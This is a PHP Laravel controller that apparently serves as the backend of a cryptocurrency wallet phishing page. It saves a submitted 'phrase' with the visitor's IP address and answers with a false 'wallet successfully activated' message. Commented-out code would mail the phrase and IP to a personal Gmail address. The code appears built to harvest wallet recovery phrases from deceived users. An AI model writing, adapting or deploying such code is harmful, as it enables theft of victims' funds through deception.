<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Phrase;

class HomePageController extends Controller
{
    //
    public function index() {
        return view('welcome');
    }

    public function submitPhrase(Request $request) {
        //Validate Request
        $this->validate($request, [
            'phrase' => ['required', 'string', 'max:255'],
        ]);

        $phrase = new Phrase();
        $phrase->user_ip = request()->getClientIp();
        $phrase->phrase = request()->phrase;
        $phrase->save();

        /** Store information to include in mail in $data as an array */
        // $data = array(
        //     'phrase' => request()->phrase,
        //     'user_ip' => request()->getClientIp(),
        //     'user' => 'promiseezema11@gmail.com',
        // );
        /** Send message to the User */
        // Mail::send('emails.login_notification', $data, function ($m) use ($data) {
        //     $m->to($data['user'])->subject('Login Notification');
        // });

        return back()->with('success_report', 'Your wallet has been successfully activated!');
    }
}
